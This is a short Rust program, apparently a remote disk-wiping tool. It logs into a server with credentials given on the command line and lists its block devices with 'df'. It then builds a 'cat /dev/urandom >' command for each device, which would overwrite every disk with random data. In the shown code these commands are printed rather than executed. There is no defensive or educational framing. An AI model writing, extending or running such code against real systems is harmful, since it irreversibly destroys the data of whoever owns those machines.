pub mod server;
use server::Disk;
use server::Server;

use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();

    let (hostname, username, password) = (&args[1], &args[2], &args[3]); //x.x.x.x:port

    let server = Server {
        hostname: String::from(hostname),
        username: String::from(username),
        password: String::from(password),
    };

    let mut disks: Vec<String> = Vec::new();
    let disks_data = server.execute_command("df -h --output=source | grep dev/");
    let begin = String::from("cat /dev/urandom >");

    for disk_name in disks_data.split(" ") {
        disks.push(disk_name.to_string());
        let command = format!("{} {}", &begin, disk_name);
    }

    for disk in disks.iter() {
        let command = format!("{} {}", begin.clone(), disk);
        println!("{}", command);
    }
}
